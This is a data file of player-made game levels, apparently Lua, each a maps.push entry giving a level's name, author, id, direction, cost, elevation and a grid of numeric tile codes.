maps.push({name="Bumpy River",author="MoistNoodlez",id="#1662073959",direction="right",cost=504,elevation=-8,map=[24,2,2,24,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,24,72,72,24,1,18,18,18,18,18,18,18,18,18,1,0,0,0,0,0,24,72,72,24,1,18,74,74,74,74,74,72,72,18,1,0,0,0,0,0,22,67,67,22,1,18,66,66,74,74,74,72,72,18,1,0,0,0,0,0,22,72,72,22,1,18,67,67,18,18,18,66,66,18,1,16,16,16,16,16,20,67,67,20,1,16,66,66,16,1,20,67,67,20,1,16,74,74,66,2,20,72,72,20,1,16,66,66,16,1,20,66,66,20,1,16,74,74,66,2,20,66,66,20,1,16,67,67,16,1,18,67,67,18,1,16,71,71,16,16,22,67,67,22,1,18,66,66,18,1,18,66,66,18,18,16,71,71,16,0,22,66,66,22,1,18,66,66,18,1,18,74,74,74,74,67,71,71,16,0,22,72,72,22,1,18,67,67,18,1,18,74,74,74,74,67,71,71,16,0,22,66,66,22,1,16,66,66,16,1,18,18,18,18,18,16,16,16,16,0,20,67,67,20,1,16,71,71,16,1,0,0,0,0,0,0,0,0,0,0,20,66,66,20,1,16,67,67,16,1,0,0,0,0,0,0,0,0,0,0,20,72,72,20,1,18,71,71,18,1,0,0,0,0,0,0,0,0,0,0,20,72,72,20,1,18,71,71,18,1,0,0,0,0,0,0,0,0,0,0,20,72,72,20,18,18,71,71,18,0,0,0,0,0,0,0,0,0,0,0,20,74,74,74,67,74,71,71,18,0,0,0,0,0,0,0,0,0,0,0,20,74,74,74,67,74,71,71,18,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Platform Walker",author="MoistNoodlez",id="#1662075872",direction="forward",cost=374,elevation=1,map=[93,18,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,18,18,18,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,3,3,14,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,14,14,14,24,0,0,0,0,0,0,19,0,0,0,0,0,0,0,0,14,91,18,14,24,67,14,14,14,0,0,0,0,19,0,0,0,0,0,0,14,18,14,77,24,67,127,127,14,18,0,0,0,0,0,19,0,0,0,0,14,14,91,77,24,67,14,14,91,14,77,24,67,0,0,0,0,0,0,0,14,91,18,77,24,67,14,14,91,14,77,24,67,0,19,0,0,0,0,0,14,14,91,77,24,67,14,14,18,14,77,24,67,0,0,0,0,0,0,0,18,14,14,77,24,67,14,14,91,14,77,24,67,0,0,0,19,0,0,0,14,91,91,77,24,67,14,14,91,14,77,24,67,0,0,0,0,0,0,0,14,14,18,77,24,67,14,18,14,18,77,24,67,0,0,19,0,0,0,0,14,14,91,77,24,67,127,14,91,14,77,24,67,0,0,0,0,0,0,0,18,126,14,77,24,67,14,14,91,14,77,24,67,0,0,0,19,0,0,0,14,14,91,77,24,67,14,18,14,18,77,24,67,0,19,0,0,19,0,0,14,14,18,77,24,67,14,14,14,14,77,24,67,0,0,0,0,0,0,0,18,91,14,14,14,14,18,91,18,14,77,24,67,0,19,0,0,19,0,0,91,14,14,14,14,14,14,14,14,14,77,24,67,0,0,0,0,0,0,0,91,14,18,91,14,18,91,18,14,14,77,24,67,0,0,19,19,0,0,0,14,126,14,14,14,14,14,14,14,128,77,24,67,0,19,2,2,19,0,0]});
maps.push({name="Juicer",author="MoistNoodlez",id="#1662076216",direction="right",cost=212,elevation=-7,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,0,0,14,14,13,12,11,10,9,8,0,0,0,0,0,0,0,0,0,94,0,0,12,0,0,76,76,76,76,8,7,0,0,0,0,0,0,0,0,9,0,0,10,0,0,76,0,0,76,76,7,6,0,0,0,0,0,0,0,10,0,0,8,0,0,76,76,76,76,76,76,6,5,0,0,0,0,0,0,11,0,0,6,0,0,76,76,76,76,76,76,76,5,0,0,0,0,0,12,0,0,0,6,0,0,76,76,76,76,76,76,76,5,6,7,8,9,10,11,0,0,0,8,0,0,76,76,76,76,76,76,76,5,0,0,0,0,0,12,0,0,0,10,0,0,76,76,76,76,76,76,6,5,0,0,0,0,0,0,11,0,0,12,0,0,76,76,76,76,76,7,6,0,0,0,0,0,0,0,10,0,0,12,0,0,76,76,76,76,8,7,0,0,0,0,0,0,0,0,9,0,0,100,14,13,12,11,10,9,8,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Water Loop",author="MoistNoodlez",id="#1662077988",direction="left",cost=332,elevation=7,map=[0,0,0,0,0,88,88,2,2,88,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,54,54,54,54,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,54,72,72,54,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,72,72,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,69,69,54,44,97,0,0,0,0,0,0,0,0,0,0,0,0,0,41,54,69,69,54,44,44,0,0,0,0,0,0,0,0,41,41,41,96,96,41,54,69,69,54,59,59,0,0,0,0,0,0,0,0,2,41,41,96,96,41,54,69,69,54,59,59,59,59,0,0,0,0,0,0,2,41,41,96,96,41,54,69,69,54,59,66,69,59,59,0,0,0,0,0,41,41,41,96,96,41,54,69,69,54,59,66,69,59,59,0,0,0,0,0,0,0,0,0,0,41,55,69,69,55,59,59,69,69,59,0,0,0,0,0,0,0,0,0,0,0,55,69,69,55,1,59,59,69,59,59,0,0,0,0,0,0,0,0,0,0,55,72,72,55,1,1,59,69,69,58,88,0,0,0,0,0,0,0,0,0,56,72,72,56,1,1,88,58,69,58,88,1,1,1,0,0,0,0,0,0,56,69,69,56,1,1,58,69,69,58,88,1,93,93,0,0,0,0,0,88,57,69,69,57,88,88,58,69,58,58,1,1,56,93,0,0,0,0,0,0,57,69,69,69,57,57,69,69,68,69,69,69,66,56,0,0,0,0,0,0,57,57,57,69,69,69,69,58,58,1,1,1,56,94,0,0,0,0,0,0,0,0,57,57,57,57,58,58,0,0,0,1,94,94,0,0,0,0,0,0,0,0,0,88,88,88,88,0,0,0,0,1,1,1]});
maps.push({name="Ruin pass",author="Luffaren",id="#1662079029",direction="left",cost=382,elevation=19,map=[0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,0,24,132,19,24,9,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,24,19,24,93,19,9,0,67,67,0,0,0,85,5,5,90,5,5,5,5,24,19,24,19,19,9,5,71,71,5,5,5,90,5,5,5,5,5,5,5,67,73,74,74,67,74,74,71,71,74,72,5,5,5,5,89,5,5,90,85,67,73,74,74,67,74,74,74,74,72,72,72,5,6,5,5,5,5,5,0,19,19,19,19,0,0,5,5,5,74,74,74,74,74,74,74,74,72,5,0,0,89,19,0,0,0,90,5,5,5,5,74,74,74,74,72,74,74,67,0,0,0,19,0,0,0,5,5,65,65,5,5,5,5,5,72,67,67,0,0,0,0,39,0,0,0,5,5,5,65,65,65,65,5,5,67,0,0,0,0,0,0,85,0,0,0,5,94,5,65,65,65,65,65,5,0,0,0,0,0,0,0,85,0,0,0,0,5,5,5,65,65,65,5,5,0,0,0,0,0,0,0,39,0,0,0,0,5,94,5,5,65,65,65,5,5,0,0,0,0,0,0,19,19,0,0,0,0,5,5,5,5,65,5,5,5,0,0,0,0,0,85,24,20,21,0,0,0,0,5,5,5,5,5,5,0,0,67,0,0,24,24,24,24,22,0,0,0,0,85,5,5,5,5,85,0,0,19,0,0,24,90,24,24,23,24,0,0,0,0,85,90,5,90,0,0,0,0,0,93,2,24,24,89,24,24,92,0,0,0,0,0,25,0,0,22,67,0,24,44,2,24,24,24,24,85,0,0,0,0,0,1,131,1,0,0,0,0,67,93,0,90,24,24,24,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0]});
maps.push({name="Wait for it",author="TF2 Pencil",id="#1662101215",direction="forward",cost=115,elevation=0,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,97,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,37,0,37,0,37,0,37,0,37,0,37,0,37,0,37,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,37,0,0,37,0,0,37,0,0,37,0,0,37,0,0,37,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,37,0,37,0,37,0,37,0,37,0,37,0,37,0,37,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,17,132,17,17,17,131,17,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2]});
maps.push({name="Canadian Flag",author="TF2 Pencil",id="#1662106376",direction="forward",cost=136,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,119,119,119,119,119,119,119,119,1,0,0,0,0,0,0,0,0,0,0,1,119,119,119,119,119,119,119,119,1,0,0,0,0,0,0,0,0,0,0,1,119,119,119,119,119,119,119,119,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,119,119,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,119,119,119,0,119,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,119,119,119,119,0,1,0,0,0,0,0,0,0,0,0,0,1,0,119,119,119,119,119,119,0,1,0,0,0,0,0,0,0,0,0,0,1,119,119,119,119,119,119,119,119,1,0,0,0,0,0,0,0,0,0,0,1,0,119,119,119,119,119,119,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,119,119,119,119,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,119,119,119,0,119,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,119,119,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,119,119,119,119,119,119,119,119,1,0,0,0,0,0,0,0,0,0,0,1,119,119,119,119,119,119,119,119,1,0,0,0,0,0,0,0,0,0,0,1,119,119,119,119,119,119,119,119,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,19,19,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0]});
maps.push({name="One at a time",author="TF2 Pencil",id="#1662106418",direction="forward",cost=328,elevation=0,map=[2,2,0,0,0,0,0,1,7,97,7,7,1,0,0,0,0,0,0,0,7,7,7,0,0,0,0,1,7,7,7,7,1,0,0,0,0,0,0,0,0,7,7,7,0,0,0,1,7,7,7,7,1,0,0,0,0,0,0,0,0,0,7,7,7,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,7,7,7,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,7,7,7,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,95,95,95,95,7,7,0,0,0,0,0,0,1,1,1,1,1,1,7,7,7,7,7,7,7,7,1,1,1,1,1,1,7,7,7,66,66,66,96,7,7,7,7,7,7,101,66,66,66,7,7,7,7,7,7,66,66,66,96,7,7,7,7,7,7,101,66,66,66,7,7,100,99,7,7,66,66,66,96,7,7,7,7,7,7,101,66,66,66,7,7,7,7,7,7,66,66,66,96,7,7,7,7,7,7,101,66,66,66,7,7,7,1,1,1,1,1,1,7,7,7,7,7,7,7,7,1,1,1,1,1,1,0,0,0,0,0,0,7,7,98,98,98,98,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,7,7,7,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,7,7,7,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,7,7,7,0,0,0,0,0,0,0,0,0,1,7,7,7,7,1,0,0,0,7,7,7,0,0,0,0,0,0,0,0,1,7,7,7,7,1,0,0,0,0,7,7,7,0,0,0,0,0,0,0,1,7,7,102,7,1,0,0,0,0,0,2,2]});
maps.push({name="Upward",author="TF2 Pencil",id="#1662106590",direction="right",cost=248,elevation=18,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,1,14,14,14,14,14,14,14,13,12,11,10,9,8,7,6,5,5,0,0,1,14,14,14,14,14,14,14,13,12,11,10,9,8,7,6,5,5,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,1,14,14,1,34,34,0,30,31,32,33,0,30,30,0,0,23,23,23,2,1,14,14,1,34,34,0,30,31,32,33,0,30,30,0,0,23,23,23,2,1,14,14,1,34,34,0,0,0,0,0,0,31,31,0,0,23,23,0,0,1,92,0,1,34,34,0,0,0,0,0,0,32,32,0,0,23,23,0,0,1,0,0,1,34,34,0,0,0,0,0,0,33,33,0,0,23,23,0,0,1,0,0,1,34,34,1,118,118,117,116,115,34,34,0,0,23,23,0,0,1,0,0,1,0,0,1,118,118,117,116,115,34,34,0,0,23,23,0,0,1,0,0,1,0,0,1,119,119,0,0,0,14,14,19,19,22,22,22,0,1,0,0,1,0,0,1,120,120,0,0,0,14,14,100,19,22,22,22,0,1,0,92,1,0,0,1,121,121,1,1,1,1,1,1,1,1,1,22,0,1,14,14,14,126,126,1,122,122,22,135,135,135,135,135,135,135,22,22,0,1,14,14,14,14,14,1,122,122,22,135,135,135,135,135,135,135,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Flyboys",author="Niikos",id="#1662126466",direction="forward",cost=186,elevation=18,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,26,26,0,0,0,0,0,0,1,94,93,1,132,32,32,32,32,129,0,0,26,26,0,0,65,32,32,32,32,32,94,1,132,32,32,32,32,129,0,0,26,26,0,0,65,32,32,32,32,32,1,1,0,0,0,0,0,0,0,0,26,26,0,0,0,0,0,0,0,33,0,0,0,0,0,0,0,0,0,0,26,26,0,0,0,0,0,0,0,34,0,0,0,0,0,0,0,0,0,0,26,26,0,0,0,0,0,0,0,35,0,0,38,38,38,38,38,65,0,0,26,26,0,0,128,38,38,38,37,36,1,1,38,38,38,38,38,65,0,0,26,26,0,0,128,38,38,38,37,36,94,1,39,0,0,0,0,0,0,0,26,26,0,0,0,0,0,0,1,94,93,1,40,0,0,0,0,0,0,0,26,26,0,0,0,0,0,0,1,1,1,1,41,0,0,0,0,0,0,0,26,26,0,0,0,0,0,0,0,0,0,0,42,42,43,44,44,129,0,0,26,26,0,0,65,44,44,125,0,0,64,64,42,42,43,44,44,129,0,0,26,26,0,0,65,44,44,125,0,0,64,64,0,0,0,0,0,0,0,0,26,26,0,0,0,0,0,0,0,0,64,64,0,0,0,0,0,0,0,0,26,26,26,131,0,0,0,0,0,0,64,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,64,0,0,0,0,0,0,0,0,0,0,0,0,44,44,64,64,64,64,64,64,0,0,0,0,0,0,0,0,0,0,0,0,44,44,44,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,2,2,44,0,0,0]});
maps.push({name="SB kinda SUS",author="MoistNoodlez",id="#1662140155",direction="forward",cost=450,elevation=0,map=[1,1,1,62,62,62,62,62,62,62,2,2,1,1,0,Vector(254,254,254),0,0,Vector(254,254,254),0,1,1,62,62,62,1,1,1,1,62,62,62,62,62,1,1,0,0,0,0,1,1,62,62,62,1,1,1,1,1,62,62,62,62,62,1,0,0,91,91,1,62,62,62,1,1,1,1,1,62,62,121,62,62,62,62,1,91,91,91,1,62,62,1,1,1,1,1,62,62,121,121,121,62,62,62,91,91,91,91,1,62,1,1,1,1,1,1,62,121,121,121,62,62,62,91,91,91,91,91,62,62,1,1,1,1,1,62,62,121,121,62,62,62,91,91,91,91,91,0,93,1,1,1,1,1,62,62,121,121,62,62,62,62,91,91,91,91,62,1,1,1,1,1,1,62,62,121,121,62,62,1,1,1,88,91,91,62,62,1,1,1,1,1,62,62,121,121,62,62,1,0,0,1,1,66,62,62,62,1,94,1,1,1,62,121,121,121,62,1,0,0,1,1,1,76,66,62,62,1,62,1,1,62,121,121,121,62,62,1,0,1,1,77,76,76,76,94,97,1,62,62,62,121,121,121,62,62,62,1,1,1,76,76,77,77,76,76,62,1,5,5,62,62,121,62,62,62,62,62,1,1,1,76,76,76,77,76,66,1,5,5,5,62,62,62,62,62,62,62,62,62,62,76,76,76,76,77,66,74,5,5,5,5,5,5,5,5,62,62,62,62,62,62,62,62,62,62,66,1,1,5,5,5,5,5,5,5,5,5,62,62,62,62,62,62,62,1,1,0,1,1,97,5,5,5,62,62,62,62,62,62,62,62,62,1,1,1,0,0,0,0,1,3,62,62,96,96,96,96,62,62,62,1,1,1,0,0,0,0,0,0,0,1,1,1,1,2,2,1,1,1,1,0,0,0,0,0,0,0]});
maps.push({name="HenTie",author="MoistNoodlez",id="#1662141148",direction="forward",cost=289,elevation=0,map=[0,0,0,0,0,0,0,0,11,11,11,2,2,11,11,11,11,0,0,0,0,0,0,0,0,0,11,11,13,13,13,13,13,13,13,13,11,0,0,0,0,0,0,11,11,11,13,13,15,15,15,15,15,15,15,15,13,11,0,0,11,11,11,13,13,13,15,15,17,17,17,17,17,17,17,15,15,13,11,0,13,13,13,13,15,15,17,17,0,0,0,0,0,0,17,17,15,13,11,11,15,15,15,15,17,17,17,0,0,0,0,0,0,0,0,17,17,15,13,11,15,17,17,17,0,0,0,76,0,0,76,76,76,76,0,0,17,15,13,39,15,17,0,0,0,39,0,76,76,76,76,76,76,76,76,0,39,39,39,11,15,76,0,1,0,39,0,76,0,0,0,0,0,0,0,0,17,15,13,39,76,76,0,0,0,0,0,0,0,0,0,0,0,19,0,Vector(255,249,254),17,15,13,39,100,76,0,1,0,0,0,0,0,0,0,0,Vector(248,255,253),19,Vector(249,253,252),Vector(253,248,252),39,39,39,11,76,76,0,0,0,0,0,0,0,0,0,0,0,19,0,0,17,15,13,39,15,17,17,0,0,17,17,0,0,0,Vector(255,255,250),0,93,0,0,0,17,15,13,11,13,15,17,17,17,17,15,17,0,0,0,0,19,0,0,17,15,15,13,11,13,15,15,15,15,15,15,17,17,0,0,0,0,0,17,17,15,13,11,11,11,13,13,13,13,13,15,15,17,17,0,0,0,17,17,15,15,13,11,0,11,11,11,11,11,11,13,13,15,17,17,17,17,15,15,15,13,13,11,0,0,0,0,0,0,11,11,11,13,15,15,15,15,15,13,13,11,11,11,0,0,0,0,0,0,0,0,0,11,13,13,13,13,13,11,11,11,0,0,0,0,0,0,0,0,0,0,0,11,11,11,2,2,11,11,0,0,0,0,0]});
maps.push({name="MS03 multi tp dest",author="Fara",id="#1662149872",direction="forward",cost=222,elevation=0,map=[0,0,0,0,0,0,7,100,7,0,0,1,0,0,0,30,11,2,2,11,0,0,0,0,0,0,133,7,132,0,0,0,0,0,0,30,11,11,11,11,0,30,30,0,0,0,0,30,30,0,0,0,0,0,0,30,11,94,11,11,133,7,132,0,0,0,0,0,0,0,0,1,0,0,0,30,90,11,11,1,7,100,7,0,0,0,0,0,0,0,0,0,0,0,0,30,11,89,11,11,0,0,0,0,0,0,7,100,7,0,0,0,0,0,0,30,11,11,11,11,0,0,0,0,0,0,133,7,132,0,0,1,0,0,0,67,11,11,11,90,0,30,30,0,0,0,0,30,30,0,0,0,0,0,1,11,11,11,11,11,133,7,132,0,0,0,0,0,0,0,0,0,0,0,11,11,11,1,11,11,7,100,7,0,0,0,0,0,0,0,0,0,0,0,11,131,134,11,11,89,0,0,0,0,0,0,7,100,7,0,0,0,0,0,11,131,134,11,11,11,0,0,0,0,0,0,133,7,132,0,0,0,0,0,11,11,11,11,11,11,0,30,30,0,0,0,0,30,30,0,0,0,0,0,1,11,11,11,93,11,133,7,132,0,0,0,0,0,0,0,0,1,0,0,0,67,11,90,11,11,7,100,7,0,0,0,0,0,0,0,0,0,0,0,0,30,11,11,11,11,0,0,0,0,0,0,7,100,7,0,0,0,0,0,0,30,11,11,89,11,0,0,0,0,0,0,133,7,132,0,0,1,0,0,0,30,11,11,11,1,0,30,30,0,0,0,0,30,30,0,0,0,0,0,0,30,11,90,11,11,133,7,132,0,0,0,0,0,0,0,0,0,0,0,0,30,11,11,11,11,7,100,7,0,0,0,0,0,0,0,0,1,0,0,0,30,11,2,2,11]});
maps.push({name="The Superior Nation",author="sivi",id="#1662157748",direction="forward",cost=181,elevation=0,map=[16,2,2,16,16,16,16,16,16,16,16,16,16,16,0,0,0,0,0,0,16,16,16,16,16,16,16,16,116,116,0,116,116,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,116,116,0,116,116,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,116,116,0,116,116,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,116,116,0,116,116,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,116,116,0,116,116,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,116,116,0,116,116,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,1,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,1,16,1,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,135,135,36,135,135,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,135,135,36,135,135,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,36,36,36,36,36,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,135,135,36,135,135,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,135,135,36,135,135,16,0,0,0,0,0,0,0,0,0,0,0,0,0,16,135,135,36,135,135,16,0,0,0,0,0,0,16,16,16,16,16,16,16,16,135,135,36,135,135,16,0,0,0,0,0,0,16,2,2,16,16,16,16,16,16,16,16,16,16,16,0,0,0,0,0,0]});
maps.push({name="Bounce House",author="MoistNoodlez",id="#1662157851",direction="forward",cost=664,elevation=0,map=[1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,1,1,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,19,19,19,19,19,1,1,93,19,14,131,133,131,131,131,131,131,131,14,1,19,19,19,19,19,1,1,19,14,131,131,131,131,131,133,131,133,131,14,1,19,19,19,19,19,1,1,19,14,131,133,131,131,131,131,131,131,131,14,1,19,19,19,19,19,1,1,19,14,131,131,131,131,133,131,133,131,131,14,1,19,75,75,75,19,1,1,19,14,131,131,133,131,131,131,131,131,131,14,19,19,75,75,75,19,1,1,19,14,133,131,131,131,131,131,131,133,131,14,19,19,75,75,75,19,1,1,19,14,131,131,133,131,131,131,131,131,131,14,19,19,75,75,75,19,1,1,19,14,131,131,131,133,131,131,131,131,131,14,19,19,75,75,75,19,1,1,19,14,131,131,131,131,131,133,131,131,131,14,19,19,75,75,75,19,1,1,19,14,131,133,131,131,131,131,131,131,131,14,1,19,75,75,75,19,1,1,19,14,131,131,131,131,133,131,131,133,131,14,1,19,66,66,66,19,1,1,100,19,14,131,133,131,131,131,131,131,131,14,1,19,66,93,66,19,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,19,66,66,66,19,1,1,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,1,1,134,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1]});
maps.push({name="Squid Game Dalgona",author="TF2 Pencil",id="#1662174986",direction="forward",cost=527,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,130,130,130,130,130,130,130,130,15,15,130,130,130,130,38,38,130,130,0,0,130,130,130,38,130,130,130,130,130,130,130,130,130,38,38,38,130,130,0,0,130,130,130,38,38,130,38,38,130,130,130,130,38,38,38,38,130,130,0,0,130,130,38,38,38,38,38,130,130,130,130,38,38,38,38,38,130,130,0,0,130,38,38,38,38,38,130,130,130,130,38,38,38,38,38,38,130,130,0,0,130,130,38,38,38,38,38,130,130,130,130,38,38,38,38,38,130,130,0,0,130,130,130,38,38,130,38,38,130,130,130,130,38,38,38,38,130,130,0,0,130,130,130,38,130,130,130,130,130,130,130,130,130,38,38,38,130,130,0,0,130,130,130,130,130,130,130,130,130,130,130,130,130,130,38,38,130,130,0,0,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,130,0,0,130,130,38,38,130,130,130,130,130,130,130,130,38,38,38,130,130,130,0,0,130,38,38,130,130,130,38,38,130,130,130,38,38,38,38,38,130,130,0,0,130,38,38,38,130,130,130,38,130,130,38,38,38,38,38,38,38,130,0,0,38,38,38,38,38,38,38,38,130,130,38,38,38,38,38,38,38,130,0,0,130,38,38,38,130,130,130,130,130,130,38,38,38,38,38,38,38,130,0,0,130,38,38,130,130,130,130,130,130,130,130,38,38,38,38,38,130,130,0,0,130,130,38,38,130,130,130,130,130,130,130,130,38,38,38,130,130,130,0,0,130,130,130,130,130,130,130,130,15,15,130,130,130,130,130,130,130,130,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="digger",author="iProbie",id="#1662175591",direction="forward",cost=335,elevation=0,map=[0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,5,5,1,1,1,1,1,1,1,1,1,1,1,45,45,91,45,45,45,45,45,45,1,45,45,91,85,45,45,45,45,1,1,45,45,91,45,45,45,45,45,45,1,45,45,91,85,45,45,45,45,1,1,91,91,1,1,1,1,1,1,1,1,45,45,1,1,1,1,91,91,1,1,45,45,1,1,1,1,1,1,1,1,45,45,1,97,97,1,45,45,1,1,45,45,45,45,91,45,91,45,91,45,45,45,1,85,85,1,85,85,1,1,45,45,45,45,91,45,91,45,91,45,45,45,1,91,91,1,45,45,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,45,45,1,45,45,1,1,45,45,91,45,91,45,91,45,91,45,45,91,45,91,91,1,91,91,1,1,45,45,91,45,91,45,91,45,91,45,45,91,45,91,91,1,45,45,1,1,91,91,1,1,1,1,1,1,1,1,1,1,1,45,45,1,45,45,1,1,45,45,1,0,0,0,0,0,0,0,0,0,1,45,45,1,45,45,1,1,91,91,1,0,0,0,0,0,0,0,0,0,1,91,91,1,45,45,1,1,45,45,1,0,0,0,0,0,0,0,0,0,1,45,45,91,45,45,1,1,45,45,1,0,0,0,0,0,0,0,0,0,1,45,45,91,45,45,1,1,96,96,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
